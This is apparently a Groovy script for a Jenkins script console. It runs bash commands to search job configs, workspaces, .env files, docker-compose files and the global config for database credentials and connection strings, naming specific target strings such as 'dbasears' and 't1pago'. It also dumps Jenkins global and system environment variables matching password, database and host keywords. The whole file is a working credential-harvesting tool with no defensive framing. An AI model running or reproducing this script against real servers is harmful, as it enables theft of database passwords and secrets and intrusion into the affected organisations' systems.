println "=== SEARCHING DB CREDS IN JENKINS WORKSPACE ==="

def bashExec(String cmd, int timeout=10000) {
    try {
        def proc = ['bash', '-c', cmd].execute()
        proc.waitForOrKill(timeout)
        return proc.text.trim()
    } catch (Exception e) {
        return "ERR: ${e.message}"
    }
}

// 1. Python version
println "Python: ${bashExec('python --version 2>&1')}"
println "Pip packages: ${bashExec('pip list 2>/dev/null | grep -i mysql')}"

// 2. Search for JDBC/MySQL in Jenkins job configs
println "\n--- JDBC/MySQL in job XMLs ---"
println bashExec("grep -r -i 'jdbc:mysql\\|MYSQL_HOST\\|MYSQL_PASS\\|DB_HOST\\|DB_PASS\\|dbasears\\|mrc-services\\|t1pago' /var/jenkins_home/jobs/ --include='*.xml' -l 2>/dev/null | head -20")

// 3. Search in workspace directories
println "\n--- DB refs in workspace files ---"
println bashExec("find /var/jenkins_home/workspace/ -name '*.properties' -o -name '*.yml' -o -name '*.yaml' -o -name '*.env' -o -name '.env*' -o -name 'database.php' -o -name 'config.php' 2>/dev/null | head -30")

// 4. Grep for specific DB patterns in workspaces
println "\n--- DB connection strings ---"
println bashExec("grep -r -h 'jdbc:mysql\\|mysql://\\|host.*3306\\|DB_HOST\\|MYSQL_HOST\\|dbasears' /var/jenkins_home/workspace/ --include='*.properties' --include='*.yml' --include='*.yaml' --include='*.env' --include='*.php' --include='*.xml' --include='*.json' 2>/dev/null | sort -u | head -30")

// 5. Any .env files
println "\n--- .env files ---"
println bashExec("find /var/jenkins_home/workspace/ -name '.env*' -o -name 'env.*' -o -name '*.env' 2>/dev/null | head -20")

// 6. Docker compose files (often have DB creds)
println "\n--- docker-compose files ---"
def composeFiles = bashExec("find /var/jenkins_home/ -name 'docker-compose*' -o -name 'docker-compose*.yml' 2>/dev/null | head -10")
println composeFiles
composeFiles.split('\n').findAll{it.trim()}.take(5).each { f ->
    println "\n  === ${f} ==="
    println bashExec("grep -i 'mysql\\|password\\|pass\\|root\\|database\\|host' '${f}' 2>/dev/null | head -10")
}

// 7. Jenkins global config
println "\n--- Jenkins global config (DB refs) ---"
println bashExec("grep -i 'mysql\\|jdbc\\|database\\|password\\|3306\\|sears\\|t1pago\\|mrc-services' /var/jenkins_home/config.xml 2>/dev/null | head -10")

// 8. Environment variables from Jenkins
println "\n--- Jenkins env vars ---"
def jenkins = Jenkins.getInstance()
def gp = jenkins.getGlobalNodeProperties()
gp.each { p ->
    if (p instanceof hudson.slaves.EnvironmentVariablesNodeProperty) {
        p.getEnvVars().each { k, v ->
            println "  ${k}=${v}"
        }
    }
}

// 9. System env vars with keywords
println "\n--- System env (DB/Pass/Host) ---"
System.getenv().findAll { k, v ->
    def kl = k.toLowerCase()
    kl.contains('db') || kl.contains('mysql') || kl.contains('redis') || 
    kl.contains('pass') || kl.contains('database') || kl.contains('sears') ||
    kl.contains('jdbc') || kl.contains('mongo') || kl.contains('host')
}.each { k, v -> println "  ${k}=${v}" }

println "\n=== SEARCH DONE ==="
